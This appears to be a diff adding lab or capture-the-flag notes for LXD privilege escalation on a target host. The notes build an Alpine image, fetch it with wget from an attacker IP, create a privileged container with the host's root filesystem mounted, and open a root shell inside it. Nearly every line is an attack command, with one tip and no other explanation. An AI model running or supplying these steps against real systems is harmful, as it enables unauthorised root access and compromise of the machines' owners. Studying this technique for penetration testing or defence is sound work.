@@ -1,0 +1,14 @@
+git clone https://github.com/saghul/lxd-alpine-builder.git
+cd lxd-alpine-builder
+sudo bash build-alpine
+
+Important: Change the directory to ash home. Otherwise you will get error like no such file exists or file not found while importing the image.
+wget 10.10.14.197/alpine-v3.12-x86_64-20200625_0040.tar.gz
+lxc image import ./alpine-v3.12-x86_64-20200625_0040.tar.gz --alias myimage
+lxc image list
+lxc init myimage ethicalhacs -c security.privileged=true
+lxc config device add ethicalhacs mydevice disk source=/ path=/mnt/root recursive=true
+lxc start ethicalhacs
+lxc exec ethicalhacs /bin/sh
+cd /mnt/root/root
+
